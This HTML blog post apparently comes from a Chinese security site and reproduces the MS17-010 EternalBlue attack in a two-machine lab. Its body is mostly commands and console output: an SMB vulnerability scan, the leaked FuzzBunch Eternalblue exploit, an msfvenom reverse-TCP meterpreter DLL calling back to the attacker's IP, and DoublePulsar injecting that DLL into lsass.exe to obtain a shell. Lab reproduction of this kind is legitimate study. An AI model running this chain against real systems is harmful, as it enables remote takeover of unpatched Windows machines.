@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 准备这个应该和当年的ms08-067影响一样，现在微软编号MS17-010。Shadowbroker放出的NSA攻击工具攻击机：ip：192.168.153.137win7 pro 64位，python2.6.6，pywin32，pentestboxpentestbox是要用metasploite，也可以用kali。靶机：ip：192.168.153.138win7 pro 64位 0x">
+<meta name="keywords" content="smb,溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSA Eternalblue SMB远程溢出复现">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;penetration&#x2F;nsa-eternalblue-smb-remote-overflow-replication.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="0x01 准备这个应该和当年的ms08-067影响一样，现在微软编号MS17-010。Shadowbroker放出的NSA攻击工具攻击机：ip：192.168.153.137win7 pro 64位，python2.6.6，pywin32，pentestboxpentestbox是要用metasploite，也可以用kali。靶机：ip：192.168.153.138win7 pro 64位 0x">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;equation-smb.png">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;equation-smb.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>NSA Eternalblue SMB远程溢出复现</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/experience/network-port-forwarding-and-penetration.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/penetration/netease-cloud-music-client-remote-command-execution-repeat.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&text=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&is_video=false&description=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NSA Eternalblue SMB远程溢出复现&body=Check out this article: http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&name=NSA Eternalblue SMB远程溢出复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-准备"><span class="toc-number">1.</span> <span class="toc-text">0x01 准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-复现"><span class="toc-number">2.</span> <span class="toc-text">0x02 复现</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        NSA Eternalblue SMB远程溢出复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-04-24T04:57:00.000Z" itemprop="datePublished">2017-04-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/penetration/">penetration</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/smb/" rel="tag">smb</a>, <a class="tag-link" href="/tags/%E6%BA%A2%E5%87%BA/" rel="tag">溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h3><p>这个应该和当年的ms08-067影响一样，现在微软编号MS17-010。<br><a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">Shadowbroker放出的NSA攻击工具</a><br>攻击机：<br>ip：192.168.153.137<br>win7 pro 64位，<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">python2.6.6</a>，<a href="https://nchc.dl.sourceforge.net/project/pywin32/pywin32/Build%20221/pywin32-221.win32-py2.6.exe" target="_blank" rel="noopener">pywin32</a>，<a href="https://pentestbox.org/zh/" target="_blank" rel="noopener">pentestbox</a><br>pentestbox是要用metasploite，也可以用kali。<br>靶机：<br>ip：192.168.153.138<br>win7 pro 64位</p>
+<h3 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h3><p>现在metasploite已经可以检测了，在metasploit-framework/modules/auxiliary/scanner/smb目录下，<code>wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb</code><br>使用如下</p>
+<pre><code>msf &gt; use auxiliary/scanner/smb/smb_ms_17_010
+msf auxiliary(smb_ms_17_010) &gt; show options
+
+Module options (auxiliary/scanner/smb/smb_ms_17_010):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      445              yes       The SMB service port
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads
+
+msf auxiliary(smb_ms_17_010) &gt; set rhosts 192.168.153.138
+rhosts =&gt; 192.168.153.138
+msf auxiliary(smb_ms_17_010) &gt; run
+
+[*] 192.168.153.138:445   - Connected to \\192.168.153.138\IPC$ with TID = 2048
+[*] 192.168.153.138:445   - Received STATUS_INSUFF_SERVER_RESOURCES with FID = 0
+[!] 192.168.153.138:445   - Host is likely VULNERABLE to MS17-010!
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(smb_ms_17_010) &gt;</code></pre><p>存在该漏洞。<br>安装好环境后，在win 7攻击机器上切换到NSA攻击工具的windows目录，打开终端输入:python fb.py</p>
+<pre><code>C:\Users\zero\Documents\shadowbroker-master\windows
+λ python fb.py
+
+--[ Version 3.5.1
+
+[*] Loading Plugins
+[*] Initializing Fuzzbunch v3.5.1
+[*] Adding Global Variables
+[+] Set ResourcesDir =&gt; D:\DSZOPSDISK\Resources
+[+] Set Color =&gt; True
+[+] Set ShowHiddenParameters =&gt; False
+[+] Set NetworkTimeout =&gt; 60
+[+] Set LogDir =&gt; D:\logs
+[*] Autorun ON
+
+ImplantConfig Autorun List
+==========================
+
+  0) prompt confirm
+  1) execute
+
+
+Exploit Autorun List
+====================
+
+  0) apply
+  1) touch all
+  2) prompt confirm
+  3) execute
+
+
+Special Autorun List
+====================
+
+  0) apply
+  1) touch all
+  2) prompt confirm
+  3) execute
+
+
+Payload Autorun List
+====================
+
+  0) apply
+  1) prompt confirm
+  2) execute
+
+
+[+] Set FbStorage =&gt; C:\Users\zero\Documents\shadowbroker-master\windows\storage
+
+[*] Retargetting Session
+
+[?] Default Target IP Address [] : 192.168.153.138
+[?] Default Callback IP Address [] : 192.168.153.137
+[?] Use Redirection [yes] : no
+
+[?] Base Log directory [D:\logs] : smb_logs
+[*] Checking C:\Users\zero\Documents\shadowbroker-master\windows\smb_logs for projects
+Index     Project
+-----     -------
+0         Create a New Project
+
+[?] Project [0] :
+[?] New Project Name : test
+[?] Set target log directory to &apos;C:\Users\zero\Documents\shadowbroker-master\windows\smb_logs\test\z192.168.153.138&apos;? [Yes] :
+
+[*] Initializing Global State
+[+] Set TargetIp =&gt; 192.168.153.138
+[+] Set CallbackIp =&gt; 192.168.153.137
+
+[!] Redirection OFF
+[+] Set LogDir =&gt; C:\Users\zero\Documents\shadowbroker-master\windows\smb_logs\test\z192.168.153.138
+[+] Set Project =&gt; test
+
+fb &gt; use eter
+Eternalblue     Eternalchampion Eternalromance  Eternalsynergy
+fb &gt; use Eternalblue
+
+[!] Entering Plugin Context :: Eternalblue
+[*] Applying Global Variables
+[+] Set NetworkTimeout =&gt; 60
+[+] Set TargetIp =&gt; 192.168.153.138
+
+[*] Applying Session Parameters
+[*] Running Exploit Touches
+
+
+[!] Enter Prompt Mode :: Eternalblue
+
+Module: Eternalblue
+===================
+
+Name                  Value
+----                  -----
+NetworkTimeout        60
+TargetIp              192.168.153.138
+TargetPort            445
+VerifyTarget          True
+VerifyBackdoor        True
+MaxExploitAttempts    3
+GroomAllocations      12
+Target                WIN72K8R2
+
+[!] plugin variables are valid
+[?] Prompt For Variable Settings? [Yes] :
+
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
+
+[?] NetworkTimeout [60] :
+
+[*]  TargetIp :: Target IP Address
+
+[?] TargetIp [192.168.153.138] :
+
+[*]  TargetPort :: Port used by the SMB service for exploit connection
+
+[?] TargetPort [445] :
+
+[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
+
+[?] VerifyTarget [True] :
+
+[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
+
+[?] VerifyBackdoor [True] :
+
+[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
+
+[?] MaxExploitAttempts [3] :
+
+[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
+
+[?] GroomAllocations [12] :
+
+[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+
+    0) XP            Windows XP 32-Bit All Service Packs
+   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+
+[?] Target [1] :
+
+
+[!] Preparing to Execute Eternalblue
+
+[*]  Mode :: Delivery mechanism
+
+   *0) DANE     Forward deployment via DARINGNEOPHYTE
+    1) FB       Traditional deployment from within FUZZBUNCH
+
+[?] Mode [0] : 1
+[+] Run Mode: FB
+
+[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure? (y/n) [Yes] :
+[*] Redirection OFF
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[?] Destination IP [192.168.153.138] :
+[?] Destination Port [445] :
+[+] (TCP) Local 192.168.153.138:445
+
+[+] Configure Plugin Remote Tunnels
+
+
+Module: Eternalblue
+===================
+
+Name                  Value
+----                  -----
+DaveProxyPort         0
+NetworkTimeout        60
+TargetIp              192.168.153.138
+TargetPort            445
+VerifyTarget          True
+VerifyBackdoor        True
+MaxExploitAttempts    3
+GroomAllocations      12
+ShellcodeBuffer
+Target                WIN72K8R2
+
+[?] Execute Plugin? [Yes] :
+[*] Executing Plugin
+[*] Connecting to target for exploitation.
+    [+] Connection established for exploitation.
+[*] Pinging backdoor...
+    [+] Backdoor returned code: 10 - Success!
+    [+] Ping returned Target architecture: x64 (64-bit)
+    [+] Backdoor is already installed -- nothing to be done.
+[*] CORE sent serialized output blob (2 bytes):
+0x00000000  08 01                                            ..
+[*] Received output parameters from CORE
+[+] CORE terminated with status code 0x00000000
+[+] Eternalblue Succeeded
+
+fb Special (Eternalblue) &gt;</code></pre><p>看到succeeded了。接着用msfvenom生成dll。根据靶机的位数生成32或者64位的。</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.153.137 LPORT=8089 -f dll &gt; 64.dll</code></pre><p>将dll拷贝到c盘根目录。并且在metasploite中开启handler监听。</p>
+<pre><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set lhost 192.168.153.137
+lhost =&gt; 192.168.153.137
+msf exploit(handler) &gt; set lport 8089
+lport =&gt; 8089
+msf exploit(handler) &gt; run
+
+[*] Started reverse TCP handler on 192.168.153.137:8089
+[*] Starting the payload handler...</code></pre><p>然后紧接着Eternalblue，接着执行use Doublepulsar</p>
+<pre><code>fb Special (Eternalblue) &gt; use Doublepulsar
+
+[!] Entering Plugin Context :: Doublepulsar
+[*] Applying Global Variables
+[+] Set NetworkTimeout =&gt; 60
+[+] Set TargetIp =&gt; 192.168.153.138
+
+[*] Applying Session Parameters
+
+[!] Enter Prompt Mode :: Doublepulsar
+
+Module: Doublepulsar
+====================
+
+Name              Value
+----              -----
+NetworkTimeout    60
+TargetIp          192.168.153.138
+TargetPort        445
+OutputFile
+Protocol          SMB
+Architecture      x86
+Function          OutputInstall
+
+[!] Plugin Variables are NOT Valid
+[?] Prompt For Variable Settings? [Yes] :
+
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
+
+[?] NetworkTimeout [60] :
+
+[*]  TargetIp :: Target IP Address
+
+[?] TargetIp [192.168.153.138] :
+
+[*]  TargetPort :: Port used by the Double Pulsar back door
+
+[?] TargetPort [445] :
+
+[*]  Protocol :: Protocol for the backdoor to speak
+
+   *0) SMB     Ring 0 SMB (TCP 445) backdoor
+    1) RDP     Ring 0 RDP (TCP 3389) backdoor
+
+[?] Protocol [0] :
+
+[*]  Architecture :: Architecture of the target OS
+
+   *0) x86     x86 32-bits
+    1) x64     x64 64-bits
+
+[?] Architecture [0] : 1
+[+] Set Architecture =&gt; x64
+
+[*]  Function :: Operation for backdoor to perform
+
+   *0) OutputInstall     Only output the install shellcode to a binary file on disk.
+    1) Ping              Test for presence of backdoor
+    2) RunDLL            Use an APC to inject a DLL into a user mode process.
+    3) RunShellcode      Run raw shellcode
+    4) Uninstall         Remove&apos;s backdoor from system
+
+[?] Function [0] : 2
+[+] Set Function =&gt; RunDLL
+
+[*]  DllPayload :: DLL to inject into user mode
+
+[?] DllPayload [] :
+
+[*]  DllPayload :: DLL to inject into user mode
+
+[?] DllPayload [] : C:\64.dll
+[+] Set DllPayload =&gt; C:\64.dll
+
+[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
+
+[?] DllOrdinal [1] :
+
+[*]  ProcessName :: Name of process to inject into
+
+[?] ProcessName [lsass.exe] :
+
+[*]  ProcessCommandLine :: Command line of process to inject into
+
+[?] ProcessCommandLine [] :
+
+
+[!] Preparing to Execute Doublepulsar
+[*] Redirection OFF
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[?] Destination IP [192.168.153.138] :
+[?] Destination Port [445] :
+[+] (TCP) Local 192.168.153.138:445
+
+[+] Configure Plugin Remote Tunnels
+
+
+Module: Doublepulsar
+====================
+
+Name                  Value
+----                  -----
+NetworkTimeout        60
+TargetIp              192.168.153.138
+TargetPort            445
+DllPayload            C:\64.dll
+DllOrdinal            1
+ProcessName           lsass.exe
+ProcessCommandLine
+Protocol              SMB
+Architecture          x64
+Function              RunDLL
+
+[?] Execute Plugin? [Yes] :
+[*] Executing Plugin
+[+] Selected Protocol SMB
+[.] Connecting to target...
+[+] Connected to target, pinging backdoor...
+        [+] Backdoor returned code: 10 - Success!
+        [+] Ping returned Target architecture: x64 (64-bit) - XOR Key: 0xF79DA652
+    SMB Connection string is: Windows 7 Professional 7601 Service Pack 1
+    Target OS is: 7 x64
+    Target SP is: 1
+        [+] Backdoor installed
+        [+] DLL built
+        [.] Sending shellcode to inject DLL
+        [+] Backdoor returned code: 10 - Success!
+        [+] Backdoor returned code: 10 - Success!
+        [+] Backdoor returned code: 10 - Success!
+        [+] Command completed successfully
+[+] Doublepulsar Succeeded
+
+fb Payload (Doublepulsar) &gt;</code></pre><p>Doublepulsar执行成功，此时msf已经收到了shell了。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/equation-smb.png" alt=""></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-准备"><span class="toc-number">1.</span> <span class="toc-text">0x01 准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-复现"><span class="toc-number">2.</span> <span class="toc-text">0x02 复现</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&text=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&is_video=false&description=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NSA Eternalblue SMB远程溢出复现&body=Check out this article: http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&title=NSA Eternalblue SMB远程溢出复现" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/penetration/nsa-eternalblue-smb-remote-overflow-replication.html&name=NSA Eternalblue SMB远程溢出复现&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 zerokeeper
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zerokeeper';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
